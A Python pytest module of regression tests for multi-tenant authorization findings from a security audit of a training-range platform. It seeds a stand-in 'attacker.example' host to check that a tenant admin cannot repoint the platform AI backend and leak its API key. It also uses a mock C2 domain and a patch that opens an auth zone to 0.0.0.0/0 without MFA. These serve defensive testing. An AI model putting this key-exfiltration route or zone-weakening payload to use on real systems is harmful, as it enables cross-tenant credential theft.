"""Regression tests for the confirmed multi-tenant findings of audit #443.

One test per finding, each failing at the base commit (280a838b); the fix is owned by
the integrator, not this card. Marked ``audit443`` so the set is easy to select, and
``xfail(strict=True)`` per the integrator's 2026-11-05 decision so the suite stays
green until each fix lands (an XPASS then fails CI and the mark must be dropped):

- high   app/routers/ai_config.py:51 — Any tenant's admin controls the platform-wide AI
         backend and can exfiltrate its API key (rbac.py:192 gives every ``UserRole.admin``
         every Permission; admins are per tenant per rbac.py, and only
         ``is_platform_admin`` crosses tenants — nothing in ai_config.py calls it).
- medium app/routers/auth_zones.py:37 — Any tenant's admin can rewrite or delete
         platform-default auth zones that gate registration for every tenant
         (``_writable`` guards NULL-tenant rows with ``TENANT_UPDATE``, which every
         tenant's admin holds, instead of the platform administrator).
- medium app/routers/exercise_forge.py:238 — Forge with no ``range_id`` binds the
         exercise to an arbitrary in-tenant range, including a Student's live lab range
         (no state filter, no lab-session exclusion, no ORDER BY), and Run then fires
         the scenario on it (exercises.py ``run_exercise`` resolves with plain
         ``get_owned``, not ranges.py ``_changeable_range``).
- low    app/routers/templates.py:274 — Public/global templates and scenarios are listed
         to other tenants but by-id reads 404 (``get_owned`` is tenant-strict), so a
         class can be built on a template its own Instructor cannot inspect.
         scenarios.py has the identical split; both are covered here.
- low    app/rbac.py:413 — ``require_tenant_access`` can never see the path parameter it
         is supposed to check (FastAPI does not inject path params into a dependency's
         ``**kwargs``), so the 403 branch is unreachable and the check always passes.

Fixed before this card (never a failing test here): the console that outlived its
sign-in token was fixed in PR #442 (bcff2c74 / d96f8074).

Seeding follows test_platform_tenancy.py / test_tenancy_followup.py: a second tenant's
rows go straight into the session; ``acting_as`` is imported from the neighbouring
module by path. With a second tenant and PLATFORM_TENANT_ID unset, nobody is the
platform administrator (rbac.is_platform_admin fails closed), which is exactly the
precondition every cross-tenant finding needs.
"""

from __future__ import annotations

import uuid
from unittest.mock import AsyncMock, patch

import httpx
import pytest
import respx
from app.auth import CurrentUser, get_current_user
from app.course_releases.models import CourseRelease, CourseReleaseBlob
from app.db import get_db
from app.lab_sessions.models import ACTIVE as LAB_ACTIVE
from app.lab_sessions.models import LabSession
from app.models import (
    AIBackendConfig,
    AuthZonePolicy,
    Course,
    Exercise,
    Range,
    RangeState,
    Scenario,
    Template,
    Tenant,
    User,
    UserRole,
)
from app.secretbox import seal
from test_platform_tenancy import DEV_TENANT, OTHER_TENANT, acting_as

pytestmark = pytest.mark.audit443

PLATFORM_KEY = "sk-PLATFORM-SECRET-443"
ATTACKER = "http://attacker.example:9999"


def _second_tenant(db) -> None:
    """A visiting unit's tenant. With two tenants and PLATFORM_TENANT_ID unset, no admin
    is the platform administrator (app/rbac.py is_platform_admin fails closed), so a
    tenant admin is definitively not the operator."""
    db.add(Tenant(id=uuid.UUID(OTHER_TENANT), name="Tenant B", slug="tenant-b"))
    db.flush()


def _platform_backend(db) -> AIBackendConfig:
    """The platform's one primary AI backend, with its sealed key (tenant_id NULL)."""
    b = AIBackendConfig(
        name="Platform AI",
        backend_type="openai",
        base_url="http://tn-mgmt01:8000/v1",
        api_key_encrypted=seal(PLATFORM_KEY),
        is_active=True,
        is_primary=True,
    )
    db.add(b)
    db.flush()
    return b


# ── ai_config.py:51 (high) — platform AI backend and its API key ─────────
class TestAIConfigPlatformBoundary:
    def test_tenant_admin_cannot_reach_the_platform_backends(self, client, db_session, monkeypatch):
        """ai_config.py:51 (high): any tenant's admin controls the platform-wide AI
        backend. The router gates on AI_CONFIG_WRITE alone, which rbac.py:192 gives to
        every tenant's admin; only the platform administrator may cross here."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.get("/ai-config/backends").status_code == 403
            assert (
                client.patch(f"/ai-config/backends/{backend.id}", json={"base_url": ATTACKER}).status_code == 403
            )
            assert client.delete(f"/ai-config/backends/{backend.id}").status_code == 403

    def test_tenant_admin_cannot_exfiltrate_the_platform_key_via_test_generate(
        self, client, db_session, monkeypatch
    ):
        """ai_config.py:51 (high): the same admin repoints base_url at a host they choose
        and POSTs /ai-config/test-generate, which unseals the stored key (ai_config.py
        test_generate) and posts it as a Bearer header to that host
        (openai_compat.generate). The key must never reach an attacker-chosen URL."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.patch(f"/ai-config/backends/{backend.id}", json={"base_url": ATTACKER}).status_code == 403
            with respx.mock:
                route = respx.post(f"{ATTACKER}/v1/chat/completions").mock(
                    return_value=httpx.Response(200, json={"choices": [{"message": {"content": "ok"}}]})
                )
                resp = client.post("/ai-config/test-generate")
                assert resp.status_code == 403, resp.text
                assert route.called is False, "the platform AI key was posted to the repointed URL"

    def test_tenant_admin_cannot_mine_the_key_through_set_primary_or_discover(
        self, client, db_session, monkeypatch
    ):
        """ai_config.py:51 (high): the same missing platform-admin gate lets a tenant
        admin set their tenant's backend primary (redirecting every tenant's
        test-generate) and run fleet discovery, which probes an attacker-chosen URL with
        the unsealed key (ai_config.py discover_fleet_nodes -> _probe_node)."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        backend = _platform_backend(db_session)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.patch(f"/ai-config/backends/{backend.id}", json={"base_url": ATTACKER}).status_code == 403
            assert client.post(f"/ai-config/backends/{backend.id}/set-primary").status_code == 403
            with respx.mock:
                route = respx.route(host="attacker.example").mock(
                    return_value=httpx.Response(200, json={"data": [{"id": "agent"}]})
                )
                resp = client.post(f"/ai-config/backends/{backend.id}/discover")
                assert resp.status_code == 403, resp.text
                assert route.called is False, "discovery probed the attacker URL with the platform key"


# ── auth_zones.py:37 (medium) — platform-default auth zones ──────────────
class TestAuthZonePlatformDefaults:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: any tenant's admin can rewrite or delete platform-default "
        "auth zones that gate registration for every tenant (auth_zones.py:37)",
    )
    def test_foreign_tenant_admin_cannot_change_a_platform_default_zone(self, client, db_session, monkeypatch):
        """auth_zones.py:37 (medium): any tenant's admin can rewrite or delete the
        platform-default auth zones that gate registration for every tenant. ``_writable``
        guards NULL-tenant rows with TENANT_UPDATE, which every admin holds (rbac.py:192),
        not with the platform-administrator check admin.py update_tenant uses."""
        monkeypatch.delenv("PLATFORM_TENANT_ID", raising=False)
        _second_tenant(db_session)
        shared = AuthZonePolicy(id=uuid.uuid4(), zone_name="platform-default-zone", tenant_id=None)
        db_session.add(shared)
        db_session.commit()
        with acting_as(UserRole.admin, tenant=OTHER_TENANT):
            assert client.get("/auth-zones").status_code == 200  # the ids are discoverable
            resp = client.patch(
                f"/auth-zones/{shared.id}",
                json={"zone_name": "platform-default-zone", "ip_whitelist": "0.0.0.0/0", "require_mfa": False},
            )
            assert resp.status_code == 403, f"a tenant admin rewrote a platform default: {resp.text}"
            assert client.delete(f"/auth-zones/{shared.id}").status_code == 403


# ── exercise_forge.py:238 (medium) — fallback binds a live lab range ─────
class TestForgeDefaultRange:
    @patch("app.routers.exercise_forge._call_forge_ai", new_callable=AsyncMock)
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: forge with no range_id binds the exercise to an arbitrary "
        "tenant range, including a Student's live lab range (exercise_forge.py:238)",
    )
    def test_forge_fallback_never_binds_a_live_lab_range(self, mock_ai, client, db_session):
        """exercise_forge.py:238 (medium): with no range_id the fallback takes the
        tenant's first range with no state filter and no lab-session exclusion, so a
        forged exercise can be bound to a Student's live lab range (ranges.py
        _changeable_range refuses such ranges; run_exercise fires the scenario on
        whatever is bound). Correct behaviour: refuse (409, as for "no range available")
        or bind a range that is not the live lab — never the lab. The lab is the tenant's
        only range here, which makes the unordered fallback's pick deterministic (with a
        second, created-state row present, SQLite's tenant/state index happens to return
        that one first, hiding the bug on this engine)."""
        tid = uuid.UUID(DEV_TENANT)
        tpl = Template(name="Lab TPL", version="1.0", yaml="nodes: []", tenant_id=tid)
        student = User(
            id=uuid.uuid4(),
            keycloak_id=f"kc-{uuid.uuid4().hex}",
            email=f"{uuid.uuid4().hex[:10]}@example.test",
            display_name="student",
            role=UserRole.student,
            tenant_id=tid,
        )
        course = Course(name="Lab course", tenant_id=tid)
        db_session.add_all([tpl, student, course])
        db_session.flush()
        sha = uuid.uuid4().hex * 2
        db_session.add(CourseReleaseBlob(sha256=sha, size=1, data=b"x"))
        db_session.flush()
        release = CourseRelease(
            id=uuid.uuid4(),
            tenant_id=tid,
            course_id=course.id,
            catalogue_code="c",
            arc2_code="a",
            run_id="r",
            slug="s",
            title="T",
            version=1,
            release_digest=sha,
            learner_digest=sha,
            platform_digest=sha,
            instructor_digest=sha,
            blob_sha256=sha,
            meta="{}",
        )
        db_session.add(release)
        db_session.flush()
        # The tenant's only range, so the unordered fallback (no ORDER BY) cannot pick
        # anything else.
        lab = Range(name="lab-student-live", template_id=tpl.id, tenant_id=tid, state=RangeState.running)
        db_session.add(lab)
        db_session.flush()
        db_session.add(
            LabSession(
                tenant_id=tid,
                user_id=student.id,
                release_id=release.id,
                activity_id="mod_001",
                state=LAB_ACTIVE,
                profile_id="p",
                profile_digest="0" * 64,
                backend="mock",
                range_id=lab.id,
            )
        )
        db_session.commit()

        mock_ai.return_value = (
            "name: APT29 Replay\ntimeline:\n  - inject: c2_beacon\n    t: '0:05'\n"
            "    technique: T1059.001\nobjectives:\n  - detect lateral movement",
            "gpt-4o",
        )
        payload = {
            "indicators": [
                {
                    "indicator_type": "domain",
                    "value": "evil-c2.example.com",
                    "severity": "critical",
                    "mitre_attack_ids": ["T1059.001"],
                }
            ],
            "difficulty": "advanced",
            "duration_minutes": 120,
            "objective_count": 5,
        }
        resp = client.post("/exercise-forge/generate", json=payload)
        assert resp.status_code in (200, 409), resp.text  # the two outcomes the contract allows
        exercise_id = resp.json().get("exercise_id") if resp.status_code == 200 else None
        bound = db_session.get(Exercise, exercise_id).range_id if exercise_id else None
        assert bound != lab.id, (
            f"forge bound the exercise to the Student's live lab range (HTTP {resp.status_code}); "
            "Run would fire the scenario on it"
        )


# ── templates.py:274 / scenarios.py (low) — listed but unreadable ────────
class TestSharedContentReadableById:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: public/global templates are listed to other tenants but "
        "by-id reads 404, so a class can be built from an uninspectable template "
        "(templates.py:274)",
    )
    def test_listed_public_template_of_another_tenant_is_readable_by_id(self, client, db_session):
        """templates.py:274 (low): list_templates returns other tenants' public rows, but
        get_template/update/delete fetch with tenant-strict get_owned, so GET by id 404s
        a template a class can be built on (classes/sessions.py:188). A NULL-tenant
        platform row 404s the same way. By-id reads must match the list's visibility."""
        _second_tenant(db_session)
        foreign_public = Template(
            name="pub",
            version="1.0",
            yaml="name: pub\nnodes: []\n",
            tenant_id=uuid.UUID(OTHER_TENANT),
            is_public=True,
        )
        platform_row = Template(
            name="golden",
            version="1.0",
            yaml="name: golden\nnodes: []\n",
            tenant_id=None,
            is_public=True,
        )
        db_session.add_all([foreign_public, platform_row])
        db_session.commit()
        listed = {r["id"] for r in client.get("/templates").json()}
        assert str(foreign_public.id) in listed
        assert str(platform_row.id) in listed
        assert client.get(f"/templates/{foreign_public.id}").status_code == 200, "listed but unreadable"
        assert client.get(f"/templates/{platform_row.id}").status_code == 200, "listed but unreadable"

    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: public/global templates and scenarios are listed to other "
        "tenants but by-id reads 404, so a class can be built from an uninspectable "
        "scenario (templates.py:274, scenarios.py:150)",
    )
    def test_listed_public_scenario_of_another_tenant_is_readable_by_id(self, client, db_session):
        """scenarios.py:150 (low): the identical split to templates.py:274 — the list
        includes other tenants' public scenarios, the by-id read is tenant-strict and
        404s. Same finding, same visibility contract."""
        _second_tenant(db_session)
        foreign_public = Scenario(
            name="pub-scenario",
            yaml="name: pub-scenario\n",
            tenant_id=uuid.UUID(OTHER_TENANT),
            is_public=True,
        )
        db_session.add(foreign_public)
        db_session.commit()
        listed = {r["id"] for r in client.get("/scenarios").json()}
        assert str(foreign_public.id) in listed
        assert client.get(f"/scenarios/{foreign_public.id}").status_code == 200, "listed but unreadable"


# ── rbac.py:413 (low) — require_tenant_access never sees the path param ──
class TestRequireTenantAccess:
    @pytest.mark.xfail(
        strict=True,
        reason="audit #443: require_tenant_access can never see the path parameter it "
        "is supposed to check and therefore always passes (rbac.py:413)",
    )
    def test_require_tenant_access_enforces_the_path_parameter(self, db_session):
        """rbac.py:413 (low): the dependency reads kwargs.get(tenant_id_param) from
        **kwargs, but FastAPI never injects path parameters into a dependency's
        ``**kwargs`` — target_tenant_id is always None and the 403 branch is unreachable.
        A router wired exactly as the docstring example recommends must 403 a
        cross-tenant id. At base the coerced ``**kwargs`` first surface as a required
        query parameter (422 without it); once that is satisfied the dependency body runs,
        sees no path param and passes (200)."""
        from app import rbac
        from fastapi import Depends, FastAPI
        from fastapi.testclient import TestClient
        who = CurrentUser(
            id=str(uuid.uuid4()),
            email="instructor@example.test",
            display_name="instructor",
            role=UserRole.instructor,
            tenant_id=DEV_TENANT,
            keycloak_id=f"kc-{uuid.uuid4().hex[:8]}",
        )
        mini = FastAPI()
        mini.dependency_overrides[get_current_user] = lambda: who
        mini.dependency_overrides[get_db] = lambda: db_session

        @mini.get("/tenants/{tenant_id}/users")
        def list_tenant_users(
            tenant_id: uuid.UUID,
            user: CurrentUser = Depends(rbac.require_tenant_access("tenant_id")),
        ):
            return {"ok": True, "user": user.email}

        c = TestClient(mini)
        other = uuid.UUID(OTHER_TENANT)
        # The kwargs query param satisfies the coerced **kwargs, so the dependency body
        # actually runs and the unreachable 403 branch is what is exercised (200 at base).
        assert c.get(f"/tenants/{other}/users", params={"kwargs": "{}"}).status_code == 403
        assert c.get(f"/tenants/{other}/users").status_code == 403
